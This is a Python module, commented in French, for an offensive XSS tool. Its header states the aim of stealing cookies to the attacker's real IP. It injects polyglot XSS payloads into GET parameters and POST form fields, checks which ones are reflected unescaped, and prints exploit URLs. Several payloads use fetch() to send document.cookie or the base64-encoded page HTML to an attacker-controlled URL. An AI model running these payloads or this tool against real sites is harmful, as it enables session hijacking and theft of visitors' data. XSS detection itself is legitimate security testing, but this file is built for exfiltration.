#!/usr/bin/env python3
"""
☠️ XSS POLYGLOT ULTRA-AGRESSIF — OWASP A05:2025
Vol de cookies vers IP RÉELLE de l'attaquant (pas 127.0.0.1)
Intègre tes payloads de scan_get_vuln.py + exfiltration vers IP attaquant
"""

import time
from colorama import Fore, Style
from bs4 import BeautifulSoup

# Premier passage rapide (6 payloads les plus efficaces)
XSS_QUICK_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "><img src=x onerror=alert(1)>",
]


class XSSPolyglot:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.attacker_url = engine.get_attacker_url()
        self.aggressive = aggressive
        self._timeout = getattr(engine, 'request_timeout', 5)

    def scan(self, params=None):
        params = params or []
        print(f"\n{Fore.MAGENTA}[XSS POLYGLOT ULTRA-AGRESSIF] {Style.RESET_ALL}IP attaquant: {Fore.YELLOW}{self.attacker_url or 'N/A'}{Style.RESET_ALL}\n")

        polyglot_payloads = list(XSS_QUICK_PAYLOADS) + [
            "<script>alert(document.domain)</script>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "\"-alert(1)-\"",
            "';alert(1);//",
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ]
        if self.attacker_url:
            polyglot_payloads.extend([
                f"<img src=x onerror=\"fetch('{self.attacker_url}/?c='+document.cookie)\">",
                f"<script>fetch('{self.attacker_url}/?d='+btoa(document.documentElement.innerHTML))</script>",
            ])
        if self.aggressive:
            polyglot_payloads += [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<svg onload=alert&#40;1&#41;>",
                "<img src=x onerror=alert`1`>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "'';!--\"<XSS>=&{{()}}",
            ]
            if self.attacker_url:
                polyglot_payloads.append(f"<svg/onload=fetch('{self.attacker_url}/?c='+document.cookie)>")

        vulnerabilities = []

        for param in params:
            print(f"  {Fore.BLUE}-> Test GET param: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            found = False
            # Pass rapide d'abord (6 payloads)
            for payload in (XSS_QUICK_PAYLOADS if not self.aggressive else polyglot_payloads[:12]):
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                try:
                    resp = self.engine.get(injected_url, timeout=self._timeout) if hasattr(self.engine, 'get') else self.engine.session.get(injected_url, timeout=self._timeout)
                    if self._is_executable(resp.text, payload):
                        vuln = {
                            "type": "xss",
                            "cwe": "CWE-79",
                            "param": param,
                            "payload": payload,
                            "url": injected_url,
                            "evidence": "XSS reflete - payload present dans la reponse (contexte executable ou reflete)",
                        }
                        vulnerabilities.append(vuln)
                        print(f"\n    {Fore.RED}[XSS CONFIRME] {Style.RESET_ALL}{param}")
                        print(f"      Payload: {payload[:70]}{'...' if len(payload) > 70 else ''}")
                        print(f"      URL: {injected_url[:80]}...")
                        if self.attacker_url:
                            exploit_url = self.engine.build_url(param, f"<img src=x onerror=\"fetch('{self.attacker_url}/?c='+document.cookie)\">")
                            print(f"      Exploit: {exploit_url[:70]}...")
                        found = True
                        break
                except Exception:
                    continue
            if found:
                continue
            # Pass complet si pas trouvé
            for payload in polyglot_payloads[len(XSS_QUICK_PAYLOADS):]:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                try:
                    resp = self.engine.get(injected_url, timeout=self._timeout) if hasattr(self.engine, 'get') else self.engine.session.get(injected_url, timeout=self._timeout)
                    if self._is_executable(resp.text, payload):
                        vuln = {
                            "type": "xss",
                            "cwe": "CWE-79",
                            "param": param,
                            "payload": payload,
                            "url": injected_url,
                            "evidence": "XSS reflete - payload present dans la reponse",
                        }
                        vulnerabilities.append(vuln)
                        print(f"\n    {Fore.RED}[XSS CONFIRME] {Style.RESET_ALL}{param}")
                        print(f"      Payload: {payload[:70]}...")
                        break
                except Exception:
                    continue

        # Pass 2: POST (formulaires de la page)
        try:
            resp = self.engine.get(self.engine.url, timeout=10) if hasattr(self.engine, 'get') else self.engine.session.get(self.engine.url, timeout=10)
            soup = BeautifulSoup(resp.text, "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action") or ""
                method = (form.get("method") or "GET").upper()
                if method != "POST":
                    continue
                inputs = form.find_all(["input", "textarea"])
                field_names = [inp.get("name") for inp in inputs if inp.get("name")]
                if not field_names:
                    continue
                from urllib.parse import urljoin
                post_url = urljoin(self.engine.url, action) if action else self.engine.url.split("?")[0]
                for field in field_names:
                    if field in [v.get("param") for v in vulnerabilities]:
                        continue
                    print(f"  {Fore.BLUE}-> Test POST param: {Fore.YELLOW}{field}{Style.RESET_ALL}")
                    for payload in (XSS_QUICK_PAYLOADS + polyglot_payloads[len(XSS_QUICK_PAYLOADS):])[:18]:
                        try:
                            data = {f: ("x" if f != field else payload) for f in field_names}
                            resp_post = self.engine.session.post(post_url, data=data, timeout=10)
                            if self._is_executable(resp_post.text, payload):
                                vuln = {
                                    "type": "xss",
                                    "cwe": "CWE-79",
                                    "param": field,
                                    "payload": payload,
                                    "url": post_url,
                                    "evidence": "XSS reflete (POST) - payload present dans la reponse",
                                    "method": "POST",
                                }
                                vulnerabilities.append(vuln)
                                print(f"\n    {Fore.RED}[XSS CONFIRME] {Style.RESET_ALL}{field} (POST)")
                                print(f"      Payload: {payload[:60]}...")
                                break
                        except Exception:
                            continue
        except Exception:
            pass

        return vulnerabilities
    
    def _is_executable(self, html, payload):
        """Détection XSS réfléchi — preuves strictes, évite FP (contexte non exécutable)."""
        html_lower = html.lower()
        payload_lower = payload.lower()

        # Exclure pages d'erreur SQL
        if any(p in html_lower for p in ("sql syntax", "mysql error", "pdoexception", "sqlstate[", "you have an error in your sql syntax")):
            return False
        # Exclure erreurs PHP fatales
        if "fatal error" in html_lower and "parse error" in html_lower:
            return False

        # Payload encodé (HTML entities) = pas exécutable
        if "&lt;script" in html or "&lt;img" in html or "&lt;svg" in html:
            enc = payload.replace("<", "&lt;").replace(">", "&gt;")
            if enc in html:
                return False  # Réfléchi mais encodé = pas de XSS

        # Payload brut présent = potentiel, vérifier contexte exécutable
        if payload in html:
            if self._payload_in_executable_context(html, payload):
                return not self._payload_in_error_context(html, payload)
            return False
        # Variante (insensible casse)
        if payload_lower in html_lower:
            if self._payload_in_executable_context(html, payload):
                return not self._payload_in_error_context(html, payload)
            return False

        # Contexte exécutable strict : <script>, onerror=, onload=, etc. en brut
        if "<script>" in payload_lower:
            if "<script>" in html_lower and "alert" in html_lower:
                # S'assurer que alert n'est pas dans un commentaire ou string
                if self._payload_in_executable_context(html, payload):
                    return not self._payload_in_error_context(html, payload)
            return False
        for ev in ["onerror=", "onload=", "onclick=", "onmouseover="]:
            if ev in payload_lower:
                if ev in html_lower and "alert" in html_lower:
                    if self._payload_in_executable_context(html, payload):
                        return not self._payload_in_error_context(html, payload)
                return False
        return False

    def _payload_in_executable_context(self, html, payload):
        """Vérifie que le payload est dans un contexte où il serait exécuté (pas encodé)."""
        # Si le payload contient <, il doit apparaître en brut, pas en &lt;
        if "<" in payload:
            idx = html.find(payload)
            if idx == -1:
                idx = html.lower().find(payload.lower())
            if idx >= 0:
                return "<" in html[idx:idx + len(payload) + 2]  # pas &lt;
        # Pour alert(1) seul - doit être dans script/event
        if "alert" in payload.lower():
            pos = html.lower().find("alert(1)")
            if pos == -1:
                pos = html.lower().find("alert(document.domain)")
            if pos >= 0:
                before = html[max(0, pos - 80):pos].lower()
                # Contexte exécutable : inside <script>, onerror=", onload=", etc.
                return any(c in before for c in ["<script", "onerror=", "onload=", "onclick=", "'>", '">'])
        return True  # Par défaut accepter si payload trouvé
    
    def _is_valid_html_page(self, html):
        """Vérifie si c'est une page HTML valide"""
        # Indicateurs de page HTML normale
        valid_indicators = [
            '<!doctype html', '<html', '<head>', '<body>',
            'bootstrap', 'stylesheet', 'javascript', 'jquery'
        ]
        
        html_lower = html.lower()
        valid_count = sum(1 for indicator in valid_indicators if indicator in html_lower)
        
        # Doit avoir au moins 3 indicateurs pour être considéré comme valide
        return valid_count >= 3
    
    def _payload_in_error_context(self, html, payload):
        """Vérifie si le payload est dans un contexte d'erreur"""
        error_contexts = [
            'error', 'exception', 'fatal', 'warning', 'notice',
            'stack trace', 'thrown in', 'line', 'syntax error'
        ]
        
        # Chercher le payload dans le HTML
        payload_pos = html.lower().find(payload.lower())
        if payload_pos == -1:
            return False
        
        # Vérifier le contexte autour du payload (100 caractères avant/après)
        context_start = max(0, payload_pos - 100)
        context_end = min(len(html), payload_pos + len(payload) + 100)
        context = html[context_start:context_end].lower()
        
        # Si des mots d'erreur sont dans le contexte, c'est probablement un faux positif
        return any(error in context for error in error_contexts)